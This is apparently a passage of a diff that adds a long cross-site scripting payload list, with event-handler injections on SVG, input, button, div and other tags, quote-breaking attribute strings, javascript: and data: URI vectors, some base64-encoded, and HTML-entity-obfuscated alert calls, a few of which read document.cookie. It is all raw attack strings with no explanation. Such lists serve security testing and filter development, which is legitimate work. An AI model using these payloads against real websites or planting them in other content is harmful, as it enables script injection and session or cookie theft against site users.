+<svg onbegin="alert(14)">
+<svg onbegin='alert(14)'>
+<svg onbegin=alert(15)>
+<svg/onbegin=alert(15)>
+<svg onbegin="alert(15)">
+<svg onbegin='alert(15)'>
+<svg onbegin=alert(16)>
+<svg/onbegin=alert(16)>
+<svg onbegin="alert(16)">
+<svg onbegin='alert(16)'>
+<svg onbegin=alert(17)>
+<svg/onbegin=alert(17)>
+<svg onbegin="alert(17)">
+<svg onbegin='alert(17)'>
+<svg onbegin=alert(18)>
+<svg/onbegin=alert(18)>
+<svg onbegin="alert(18)">
+<svg onbegin='alert(18)'>
+<svg onbegin=alert(19)>
+<svg/onbegin=alert(19)>
+<svg onbegin="alert(19)">
+<svg onbegin='alert(19)'>
+<svg onbegin=alert(20)>
+<svg/onbegin=alert(20)>
+<svg onbegin="alert(20)">
+<svg onbegin='alert(20)'>
+<svg onend=alert(1)>
+<svg/onend=alert(1)>
+<svg onend="alert(1)">
+<svg onend='alert(1)'>
+<svg onend=alert(2)>
+<svg/onend=alert(2)>
+<svg onend="alert(2)">
+<svg onend='alert(2)'>
+<svg onend=alert(3)>
+<svg/onend=alert(3)>
+<svg onend="alert(3)">
+<svg onend='alert(3)'>
+<svg onend=alert(4)>
+<svg/onend=alert(4)>
+<svg onend="alert(4)">
+<svg onend='alert(4)'>
+<svg onend=alert(5)>
+<svg/onend=alert(5)>
+<svg onend="alert(5)">
+<svg onend='alert(5)'>
+<svg onend=alert(6)>
+<svg/onend=alert(6)>
+<svg onend="alert(6)">
+<svg onend='alert(6)'>
+<svg onend=alert(7)>
+<svg/onend=alert(7)>
+<svg onend="alert(7)">
+<svg onend='alert(7)'>
+<svg onend=alert(8)>
+<svg/onend=alert(8)>
+<svg onend="alert(8)">
+<svg onend='alert(8)'>
+<svg onend=alert(9)>
+<svg/onend=alert(9)>
+<svg onend="alert(9)">
+<svg onend='alert(9)'>
+<svg onend=alert(10)>
+<svg/onend=alert(10)>
+<svg onend="alert(10)">
+<svg onend='alert(10)'>
+<svg onend=alert(11)>
+<svg/onend=alert(11)>
+<svg onend="alert(11)">
+<svg onend='alert(11)'>
+<svg onend=alert(12)>
+<svg/onend=alert(12)>
+<svg onend="alert(12)">
+<svg onend='alert(12)'>
+<svg onend=alert(13)>
+<svg/onend=alert(13)>
+<svg onend="alert(13)">
+<svg onend='alert(13)'>
+<svg onend=alert(14)>
+<svg/onend=alert(14)>
+<svg onend="alert(14)">
+<svg onend='alert(14)'>
+<svg onend=alert(15)>
+<svg/onend=alert(15)>
+<svg onend="alert(15)">
+<svg onend='alert(15)'>
+<svg onend=alert(16)>
+<svg/onend=alert(16)>
+<svg onend="alert(16)">
+<svg onend='alert(16)'>
+<svg onend=alert(17)>
+<svg/onend=alert(17)>
+<svg onend="alert(17)">
+<svg onend='alert(17)'>
+<svg onend=alert(18)>
+<svg/onend=alert(18)>
+<svg onend="alert(18)">
+<svg onend='alert(18)'>
+<svg onend=alert(19)>
+<svg/onend=alert(19)>
+<svg onend="alert(19)">
+<svg onend='alert(19)'>
+<svg onend=alert(20)>
+<svg/onend=alert(20)>
+<svg onend="alert(20)">
+<svg onend='alert(20)'>
+<svg onerror=alert(1)>
+<svg/onerror=alert(1)>
+<svg onerror="alert(1)">
+<svg onerror='alert(1)'>
+<svg onerror=alert(2)>
+<svg/onerror=alert(2)>
+<svg onerror="alert(2)">
+<svg onerror='alert(2)'>
+<svg onerror=alert(3)>
+<svg/onerror=alert(3)>
+<svg onerror="alert(3)">
+<svg onerror='alert(3)'>
+<svg onerror=alert(4)>
+<svg/onerror=alert(4)>
+<svg onerror="alert(4)">
+<svg onerror='alert(4)'>
+<svg onerror=alert(5)>
+<svg/onerror=alert(5)>
+<svg onerror="alert(5)">
+<svg onerror='alert(5)'>
+<svg onerror=alert(6)>
+<svg/onerror=alert(6)>
+<svg onerror="alert(6)">
+<svg onerror='alert(6)'>
+<svg onerror=alert(7)>
+<svg/onerror=alert(7)>
+<svg onerror="alert(7)">
+<svg onerror='alert(7)'>
+<svg onerror=alert(8)>
+<svg/onerror=alert(8)>
+<svg onerror="alert(8)">
+<svg onerror='alert(8)'>
+<svg onerror=alert(9)>
+<svg/onerror=alert(9)>
+<svg onerror="alert(9)">
+<svg onerror='alert(9)'>
+<svg onerror=alert(10)>
+<svg/onerror=alert(10)>
+<svg onerror="alert(10)">
+<svg onerror='alert(10)'>
+<svg onerror=alert(11)>
+<svg/onerror=alert(11)>
+<svg onerror="alert(11)">
+<svg onerror='alert(11)'>
+<svg onerror=alert(12)>
+<svg/onerror=alert(12)>
+<svg onerror="alert(12)">
+<svg onerror='alert(12)'>
+<svg onerror=alert(13)>
+<svg/onerror=alert(13)>
+<svg onerror="alert(13)">
+<svg onerror='alert(13)'>
+<svg onerror=alert(14)>
+<svg/onerror=alert(14)>
+<svg onerror="alert(14)">
+<svg onerror='alert(14)'>
+<svg onerror=alert(15)>
+<svg/onerror=alert(15)>
+<svg onerror="alert(15)">
+<svg onerror='alert(15)'>
+<svg onerror=alert(16)>
+<svg/onerror=alert(16)>
+<svg onerror="alert(16)">
+<svg onerror='alert(16)'>
+<svg onerror=alert(17)>
+<svg/onerror=alert(17)>
+<svg onerror="alert(17)">
+<svg onerror='alert(17)'>
+<svg onerror=alert(18)>
+<svg/onerror=alert(18)>
+<svg onerror="alert(18)">
+<svg onerror='alert(18)'>
+<svg onerror=alert(19)>
+<svg/onerror=alert(19)>
+<svg onerror="alert(19)">
+<svg onerror='alert(19)'>
+<svg onerror=alert(20)>
+<svg/onerror=alert(20)>
+<svg onerror="alert(20)">
+<svg onerror='alert(20)'>
+<svg onabort=alert(1)>
+<svg/onabort=alert(1)>
+<svg onabort="alert(1)">
+<svg onabort='alert(1)'>
+<svg onabort=alert(2)>
+<svg/onabort=alert(2)>
+<svg onabort="alert(2)">
+<svg onabort='alert(2)'>
+<svg onabort=alert(3)>
+<svg/onabort=alert(3)>
+<svg onabort="alert(3)">
+<svg onabort='alert(3)'>
+<svg onabort=alert(4)>
+<svg/onabort=alert(4)>
+<svg onabort="alert(4)">
+<svg onabort='alert(4)'>
+<svg onabort=alert(5)>
+<svg/onabort=alert(5)>
+<svg onabort="alert(5)">
+<svg onabort='alert(5)'>
+<svg onabort=alert(6)>
+<svg/onabort=alert(6)>
+<svg onabort="alert(6)">
+<svg onabort='alert(6)'>
+<svg onabort=alert(7)>
+<svg/onabort=alert(7)>
+<svg onabort="alert(7)">
+<svg onabort='alert(7)'>
+<svg onabort=alert(8)>
+<svg/onabort=alert(8)>
+<svg onabort="alert(8)">
+<svg onabort='alert(8)'>
+<svg onabort=alert(9)>
+<svg/onabort=alert(9)>
+<svg onabort="alert(9)">
+<svg onabort='alert(9)'>
+<svg onabort=alert(10)>
+<svg/onabort=alert(10)>
+<svg onabort="alert(10)">
+<svg onabort='alert(10)'>
+<svg onabort=alert(11)>
+<svg/onabort=alert(11)>
+<svg onabort="alert(11)">
+<svg onabort='alert(11)'>
+<svg onabort=alert(12)>
+<svg/onabort=alert(12)>
+<svg onabort="alert(12)">
+<svg onabort='alert(12)'>
+<svg onabort=alert(13)>
+<svg/onabort=alert(13)>
+<svg onabort="alert(13)">
+<svg onabort='alert(13)'>
+<svg onabort=alert(14)>
+<svg/onabort=alert(14)>
+<svg onabort="alert(14)">
+<svg onabort='alert(14)'>
+<svg onabort=alert(15)>
+<svg/onabort=alert(15)>
+<svg onabort="alert(15)">
+<svg onabort='alert(15)'>
+<svg onabort=alert(16)>
+<svg/onabort=alert(16)>
+<svg onabort="alert(16)">
+<svg onabort='alert(16)'>
+<svg onabort=alert(17)>
+<svg/onabort=alert(17)>
+<svg onabort="alert(17)">
+<svg onabort='alert(17)'>
+<svg onabort=alert(18)>
+<svg/onabort=alert(18)>
+<svg onabort="alert(18)">
+<svg onabort='alert(18)'>
+<svg onabort=alert(19)>
+<svg/onabort=alert(19)>
+<svg onabort="alert(19)">
+<svg onabort='alert(19)'>
+<svg onabort=alert(20)>
+<svg/onabort=alert(20)>
+<svg onabort="alert(20)">
+<svg onabort='alert(20)'>
+<input onclick=alert(1) autofocus>
+<input ondblclick=alert(1) autofocus>
+<input onmousedown=alert(1) autofocus>
+<input onmouseup=alert(1) autofocus>
+<input onmouseover=alert(1) autofocus>
+<input onmouseout=alert(1) autofocus>
+<input onkeydown=alert(1) autofocus>
+<input onkeyup=alert(1) autofocus>
+<input onkeypress=alert(1) autofocus>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus>
+<input oninput=alert(1) autofocus>
+<input onchange=alert(1) autofocus>
+<input onsubmit=alert(1) autofocus>
+<input onreset=alert(1) autofocus>
+<input onselect=alert(1) autofocus>
+<input onload=alert(1) autofocus>
+<input onerror=alert(1) autofocus>
+<input onabort=alert(1) autofocus>
+<input ontoggle=alert(1) autofocus>
+<button onclick=alert(1)>
+<button ondblclick=alert(1)>
+<button onmousedown=alert(1)>
+<button onmouseup=alert(1)>
+<button onmouseover=alert(1)>
+<button onmouseout=alert(1)>
+<button onkeydown=alert(1)>
+<button onkeyup=alert(1)>
+<button onkeypress=alert(1)>
+<button onfocus=alert(1)>
+<button onblur=alert(1)>
+<button oninput=alert(1)>
+<button onchange=alert(1)>
+<button onsubmit=alert(1)>
+<button onreset=alert(1)>
+<button onselect=alert(1)>
+<button onload=alert(1)>
+<button onerror=alert(1)>
+<button onabort=alert(1)>
+<button ontoggle=alert(1)>
+<select onclick=alert(1)>
+<select ondblclick=alert(1)>
+<select onmousedown=alert(1)>
+<select onmouseup=alert(1)>
+<select onmouseover=alert(1)>
+<select onmouseout=alert(1)>
+<select onkeydown=alert(1)>
+<select onkeyup=alert(1)>
+<select onkeypress=alert(1)>
+<select onfocus=alert(1)>
+<select onblur=alert(1)>
+<select oninput=alert(1)>
+<select onchange=alert(1)>
+<select onsubmit=alert(1)>
+<select onreset=alert(1)>
+<select onselect=alert(1)>
+<select onload=alert(1)>
+<select onerror=alert(1)>
+<select onabort=alert(1)>
+<select ontoggle=alert(1)>
+<textarea onclick=alert(1)>
+<textarea ondblclick=alert(1)>
+<textarea onmousedown=alert(1)>
+<textarea onmouseup=alert(1)>
+<textarea onmouseover=alert(1)>
+<textarea onmouseout=alert(1)>
+<textarea onkeydown=alert(1)>
+<textarea onkeyup=alert(1)>
+<textarea onkeypress=alert(1)>
+<textarea onfocus=alert(1)>
+<textarea onblur=alert(1)>
+<textarea oninput=alert(1)>
+<textarea onchange=alert(1)>
+<textarea onsubmit=alert(1)>
+<textarea onreset=alert(1)>
+<textarea onselect=alert(1)>
+<textarea onload=alert(1)>
+<textarea onerror=alert(1)>
+<textarea onabort=alert(1)>
+<textarea ontoggle=alert(1)>
+<body onclick=alert(1)>
+<body ondblclick=alert(1)>
+<body onmousedown=alert(1)>
+<body onmouseup=alert(1)>
+<body onmouseover=alert(1)>
+<body onmouseout=alert(1)>
+<body onkeydown=alert(1)>
+<body onkeyup=alert(1)>
+<body onkeypress=alert(1)>
+<body onfocus=alert(1)>
+<body onblur=alert(1)>
+<body oninput=alert(1)>
+<body onchange=alert(1)>
+<body onsubmit=alert(1)>
+<body onreset=alert(1)>
+<body onselect=alert(1)>
+<body onload=alert(1)>
+<body onerror=alert(1)>
+<body onabort=alert(1)>
+<body ontoggle=alert(1)>
+<div onclick=alert(1)>
+<div ondblclick=alert(1)>
+<div onmousedown=alert(1)>
+<div onmouseup=alert(1)>
+<div onmouseover=alert(1)>
+<div onmouseout=alert(1)>
+<div onkeydown=alert(1)>
+<div onkeyup=alert(1)>
+<div onkeypress=alert(1)>
+<div onfocus=alert(1)>
+<div onblur=alert(1)>
+<div oninput=alert(1)>
+<div onchange=alert(1)>
+<div onsubmit=alert(1)>
+<div onreset=alert(1)>
+<div onselect=alert(1)>
+<div onload=alert(1)>
+<div onerror=alert(1)>
+<div onabort=alert(1)>
+<div ontoggle=alert(1)>
+<a onclick=alert(1)>
+<a ondblclick=alert(1)>
+<a onmousedown=alert(1)>
+<a onmouseup=alert(1)>
+<a onmouseover=alert(1)>
+<a onmouseout=alert(1)>
+<a onkeydown=alert(1)>
+<a onkeyup=alert(1)>
+<a onkeypress=alert(1)>
+<a onfocus=alert(1)>
+<a onblur=alert(1)>
+<a oninput=alert(1)>
+<a onchange=alert(1)>
+<a onsubmit=alert(1)>
+<a onreset=alert(1)>
+<a onselect=alert(1)>
+<a onload=alert(1)>
+<a onerror=alert(1)>
+<a onabort=alert(1)>
+<a ontoggle=alert(1)>
+<details open onclick=alert(1)>
+<details open ondblclick=alert(1)>
+<details open onmousedown=alert(1)>
+<details open onmouseup=alert(1)>
+<details open onmouseover=alert(1)>
+<details open onmouseout=alert(1)>
+<details open onkeydown=alert(1)>
+<details open onkeyup=alert(1)>
+<details open onkeypress=alert(1)>
+<details open onfocus=alert(1)>
+<details open onblur=alert(1)>
+<details open oninput=alert(1)>
+<details open onchange=alert(1)>
+<details open onsubmit=alert(1)>
+<details open onreset=alert(1)>
+<details open onselect=alert(1)>
+<details open onload=alert(1)>
+<details open onerror=alert(1)>
+<details open onabort=alert(1)>
+<details open ontoggle=alert(1)>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+" onload=alert(1) x="
+"><script>alert(2)</script>
+"><img src=x onerror=alert(2)>
+" onload=alert(2) x="
+"><script>alert(3)</script>
+"><img src=x onerror=alert(3)>
+" onload=alert(3) x="
+"><script>alert(4)</script>
+"><img src=x onerror=alert(4)>
+" onload=alert(4) x="
+"><script>alert(5)</script>
+"><img src=x onerror=alert(5)>
+" onload=alert(5) x="
+"><script>alert(6)</script>
+"><img src=x onerror=alert(6)>
+" onload=alert(6) x="
+"><script>alert(7)</script>
+"><img src=x onerror=alert(7)>
+" onload=alert(7) x="
+"><script>alert(8)</script>
+"><img src=x onerror=alert(8)>
+" onload=alert(8) x="
+"><script>alert(9)</script>
+"><img src=x onerror=alert(9)>
+" onload=alert(9) x="
+"><script>alert(10)</script>
+"><img src=x onerror=alert(10)>
+" onload=alert(10) x="
+"><script>alert(11)</script>
+"><img src=x onerror=alert(11)>
+" onload=alert(11) x="
+"><script>alert(12)</script>
+"><img src=x onerror=alert(12)>
+" onload=alert(12) x="
+"><script>alert(13)</script>
+"><img src=x onerror=alert(13)>
+" onload=alert(13) x="
+"><script>alert(14)</script>
+"><img src=x onerror=alert(14)>
+" onload=alert(14) x="
+"><script>alert(15)</script>
+"><img src=x onerror=alert(15)>
+" onload=alert(15) x="
+"><script>alert(16)</script>
+"><img src=x onerror=alert(16)>
+" onload=alert(16) x="
+"><script>alert(17)</script>
+"><img src=x onerror=alert(17)>
+" onload=alert(17) x="
+"><script>alert(18)</script>
+"><img src=x onerror=alert(18)>
+" onload=alert(18) x="
+"><script>alert(19)</script>
+"><img src=x onerror=alert(19)>
+" onload=alert(19) x="
+"><script>alert(20)</script>
+"><img src=x onerror=alert(20)>
+" onload=alert(20) x="
+"><script>alert(21)</script>
+"><img src=x onerror=alert(21)>
+" onload=alert(21) x="
+"><script>alert(22)</script>
+"><img src=x onerror=alert(22)>
+" onload=alert(22) x="
+"><script>alert(23)</script>
+"><img src=x onerror=alert(23)>
+" onload=alert(23) x="
+"><script>alert(24)</script>
+"><img src=x onerror=alert(24)>
+" onload=alert(24) x="
+"><script>alert(25)</script>
+"><img src=x onerror=alert(25)>
+" onload=alert(25) x="
+"><script>alert(26)</script>
+"><img src=x onerror=alert(26)>
+" onload=alert(26) x="
+"><script>alert(27)</script>
+"><img src=x onerror=alert(27)>
+" onload=alert(27) x="
+"><script>alert(28)</script>
+"><img src=x onerror=alert(28)>
+" onload=alert(28) x="
+"><script>alert(29)</script>
+"><img src=x onerror=alert(29)>
+" onload=alert(29) x="
+"><script>alert(30)</script>
+"><img src=x onerror=alert(30)>
+" onload=alert(30) x="
+"><script>alert(31)</script>
+"><img src=x onerror=alert(31)>
+" onload=alert(31) x="
+"><script>alert(32)</script>
+"><img src=x onerror=alert(32)>
+" onload=alert(32) x="
+"><script>alert(33)</script>
+"><img src=x onerror=alert(33)>
+" onload=alert(33) x="
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+' onload=alert(1) x='
+'><script>alert(2)</script>
+'><img src=x onerror=alert(2)>
+' onload=alert(2) x='
+'><script>alert(3)</script>
+'><img src=x onerror=alert(3)>
+' onload=alert(3) x='
+'><script>alert(4)</script>
+'><img src=x onerror=alert(4)>
+' onload=alert(4) x='
+'><script>alert(5)</script>
+'><img src=x onerror=alert(5)>
+' onload=alert(5) x='
+'><script>alert(6)</script>
+'><img src=x onerror=alert(6)>
+' onload=alert(6) x='
+'><script>alert(7)</script>
+'><img src=x onerror=alert(7)>
+' onload=alert(7) x='
+'><script>alert(8)</script>
+'><img src=x onerror=alert(8)>
+' onload=alert(8) x='
+'><script>alert(9)</script>
+'><img src=x onerror=alert(9)>
+' onload=alert(9) x='
+'><script>alert(10)</script>
+'><img src=x onerror=alert(10)>
+' onload=alert(10) x='
+'><script>alert(11)</script>
+'><img src=x onerror=alert(11)>
+' onload=alert(11) x='
+'><script>alert(12)</script>
+'><img src=x onerror=alert(12)>
+' onload=alert(12) x='
+'><script>alert(13)</script>
+'><img src=x onerror=alert(13)>
+' onload=alert(13) x='
+'><script>alert(14)</script>
+'><img src=x onerror=alert(14)>
+' onload=alert(14) x='
+'><script>alert(15)</script>
+'><img src=x onerror=alert(15)>
+' onload=alert(15) x='
+'><script>alert(16)</script>
+'><img src=x onerror=alert(16)>
+' onload=alert(16) x='
+'><script>alert(17)</script>
+'><img src=x onerror=alert(17)>
+' onload=alert(17) x='
+'><script>alert(18)</script>
+'><img src=x onerror=alert(18)>
+' onload=alert(18) x='
+'><script>alert(19)</script>
+'><img src=x onerror=alert(19)>
+' onload=alert(19) x='
+'><script>alert(20)</script>
+'><img src=x onerror=alert(20)>
+' onload=alert(20) x='
+'><script>alert(21)</script>
+'><img src=x onerror=alert(21)>
+' onload=alert(21) x='
+'><script>alert(22)</script>
+'><img src=x onerror=alert(22)>
+' onload=alert(22) x='
+'><script>alert(23)</script>
+'><img src=x onerror=alert(23)>
+' onload=alert(23) x='
+'><script>alert(24)</script>
+'><img src=x onerror=alert(24)>
+' onload=alert(24) x='
+'><script>alert(25)</script>
+'><img src=x onerror=alert(25)>
+' onload=alert(25) x='
+'><script>alert(26)</script>
+'><img src=x onerror=alert(26)>
+' onload=alert(26) x='
+'><script>alert(27)</script>
+'><img src=x onerror=alert(27)>
+' onload=alert(27) x='
+'><script>alert(28)</script>
+'><img src=x onerror=alert(28)>
+' onload=alert(28) x='
+'><script>alert(29)</script>
+'><img src=x onerror=alert(29)>
+' onload=alert(29) x='
+'><script>alert(30)</script>
+'><img src=x onerror=alert(30)>
+' onload=alert(30) x='
+'><script>alert(31)</script>
+'><img src=x onerror=alert(31)>
+' onload=alert(31) x='
+'><script>alert(32)</script>
+'><img src=x onerror=alert(32)>
+' onload=alert(32) x='
+'><script>alert(33)</script>
+'><img src=x onerror=alert(33)>
+' onload=alert(33) x='
+`><script>alert(1)</script>
+`><img src=x onerror=alert(1)>
+` onload=alert(1) x=`
+`><script>alert(2)</script>
+`><img src=x onerror=alert(2)>
+` onload=alert(2) x=`
+`><script>alert(3)</script>
+`><img src=x onerror=alert(3)>
+` onload=alert(3) x=`
+`><script>alert(4)</script>
+`><img src=x onerror=alert(4)>
+` onload=alert(4) x=`
+`><script>alert(5)</script>
+`><img src=x onerror=alert(5)>
+` onload=alert(5) x=`
+`><script>alert(6)</script>
+`><img src=x onerror=alert(6)>
+` onload=alert(6) x=`
+`><script>alert(7)</script>
+`><img src=x onerror=alert(7)>
+` onload=alert(7) x=`
+`><script>alert(8)</script>
+`><img src=x onerror=alert(8)>
+` onload=alert(8) x=`
+`><script>alert(9)</script>
+`><img src=x onerror=alert(9)>
+` onload=alert(9) x=`
+`><script>alert(10)</script>
+`><img src=x onerror=alert(10)>
+` onload=alert(10) x=`
+`><script>alert(11)</script>
+`><img src=x onerror=alert(11)>
+` onload=alert(11) x=`
+`><script>alert(12)</script>
+`><img src=x onerror=alert(12)>
+` onload=alert(12) x=`
+`><script>alert(13)</script>
+`><img src=x onerror=alert(13)>
+` onload=alert(13) x=`
+`><script>alert(14)</script>
+`><img src=x onerror=alert(14)>
+` onload=alert(14) x=`
+`><script>alert(15)</script>
+`><img src=x onerror=alert(15)>
+` onload=alert(15) x=`
+`><script>alert(16)</script>
+`><img src=x onerror=alert(16)>
+` onload=alert(16) x=`
+`><script>alert(17)</script>
+`><img src=x onerror=alert(17)>
+` onload=alert(17) x=`
+`><script>alert(18)</script>
+`><img src=x onerror=alert(18)>
+` onload=alert(18) x=`
+`><script>alert(19)</script>
+`><img src=x onerror=alert(19)>
+` onload=alert(19) x=`
+`><script>alert(20)</script>
+`><img src=x onerror=alert(20)>
+` onload=alert(20) x=`
+`><script>alert(21)</script>
+`><img src=x onerror=alert(21)>
+` onload=alert(21) x=`
+`><script>alert(22)</script>
+`><img src=x onerror=alert(22)>
+` onload=alert(22) x=`
+`><script>alert(23)</script>
+`><img src=x onerror=alert(23)>
+` onload=alert(23) x=`
+`><script>alert(24)</script>
+`><img src=x onerror=alert(24)>
+` onload=alert(24) x=`
+`><script>alert(25)</script>
+`><img src=x onerror=alert(25)>
+` onload=alert(25) x=`
+`><script>alert(26)</script>
+`><img src=x onerror=alert(26)>
+` onload=alert(26) x=`
+`><script>alert(27)</script>
+`><img src=x onerror=alert(27)>
+` onload=alert(27) x=`
+`><script>alert(28)</script>
+`><img src=x onerror=alert(28)>
+` onload=alert(28) x=`
+`><script>alert(29)</script>
+`><img src=x onerror=alert(29)>
+` onload=alert(29) x=`
+`><script>alert(30)</script>
+`><img src=x onerror=alert(30)>
+` onload=alert(30) x=`
+`><script>alert(31)</script>
+`><img src=x onerror=alert(31)>
+` onload=alert(31) x=`
+`><script>alert(32)</script>
+`><img src=x onerror=alert(32)>
+` onload=alert(32) x=`
+`><script>alert(33)</script>
+`><img src=x onerror=alert(33)>
+` onload=alert(33) x=`
+<a href=javascript:alert(1)>XSS</a>
+<iframe src=javascript:alert(1)>
+<form action=javascript:alert(1)><input type=submit>
+<button formaction=javascript:alert(1)>XSS</button>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(document.domain)>XSS</a>
+<iframe src=javascript:alert(document.domain)>
+<form action=javascript:alert(document.domain)><input type=submit>
+<button formaction=javascript:alert(document.domain)>XSS</button>
+<object data=javascript:alert(document.domain)>
+<embed src=javascript:alert(document.domain)>
+<a href=javascript:alert(document.cookie)>XSS</a>
+<iframe src=javascript:alert(document.cookie)>
+<form action=javascript:alert(document.cookie)><input type=submit>
+<button formaction=javascript:alert(document.cookie)>XSS</button>
+<object data=javascript:alert(document.cookie)>
+<embed src=javascript:alert(document.cookie)>
+<a href=javascript:prompt(1)>XSS</a>
+<iframe src=javascript:prompt(1)>
+<form action=javascript:prompt(1)><input type=submit>
+<button formaction=javascript:prompt(1)>XSS</button>
+<object data=javascript:prompt(1)>
+<embed src=javascript:prompt(1)>
+<a href=javascript:confirm(1)>XSS</a>
+<iframe src=javascript:confirm(1)>
+<form action=javascript:confirm(1)><input type=submit>
+<button formaction=javascript:confirm(1)>XSS</button>
+<object data=javascript:confirm(1)>
+<embed src=javascript:confirm(1)>
+<a href=data:text/html,<script>alert(1)</script>>XSS</a>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>XSS</a>
+<iframe src=data:text/html,<script>alert(1)</script>>
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<object data=data:text/html,<script>alert(1)</script>>
+<embed src=data:text/html,<script>alert(1)</script>>
+<a href=data:text/html,<img src=x onerror=alert(1)>>XSS</a>
+<a href=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==>XSS</a>
+<iframe src=data:text/html,<img src=x onerror=alert(1)>>
+<iframe src=data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==>
+<object data=data:text/html,<img src=x onerror=alert(1)>>
+<embed src=data:text/html,<img src=x onerror=alert(1)>>
+<a href=data:text/html,<svg onload=alert(1)>>XSS</a>
+<a href=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>XSS</a>
+<iframe src=data:text/html,<svg onload=alert(1)>>
+<iframe src=data:text/html;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+>
+<object data=data:text/html,<svg onload=alert(1)>>
+<embed src=data:text/html,<svg onload=alert(1)>>
+<script>&#97;&#108;&#101;&#114;&#116;(1)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(1)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
+<script>&#97;&#108;&#101;&#114;&#116;(2)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(2)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(2)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(2)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(2)>
+<script>&#97;&#108;&#101;&#114;&#116;(3)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(3)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(3)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(3)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(3)>
+<script>&#97;&#108;&#101;&#114;&#116;(4)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(4)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(4)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(4)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(4)>
+<script>&#97;&#108;&#101;&#114;&#116;(5)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(5)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(5)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(5)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(5)>
+<script>&#97;&#108;&#101;&#114;&#116;(6)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(6)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(6)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(6)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(6)>
+<script>&#97;&#108;&#101;&#114;&#116;(7)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(7)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(7)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(7)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(7)>
+<script>&#97;&#108;&#101;&#114;&#116;(8)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(8)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(8)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(8)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(8)>
+<script>&#97;&#108;&#101;&#114;&#116;(9)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(9)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(9)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(9)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(9)>
+<script>&#97;&#108;&#101;&#114;&#116;(10)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(10)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(10)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(10)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(10)>
+<script>&#97;&#108;&#101;&#114;&#116;(11)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(11)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(11)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(11)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(11)>
+<script>&#97;&#108;&#101;&#114;&#116;(12)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(12)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(12)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(12)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(12)>
+<script>&#97;&#108;&#101;&#114;&#116;(13)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(13)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(13)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(13)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(13)>
+<script>&#97;&#108;&#101;&#114;&#116;(14)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(14)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(14)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(14)>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(14)>
+<script>&#97;&#108;&#101;&#114;&#116;(15)</script>
+<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(15)</script>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(15)>
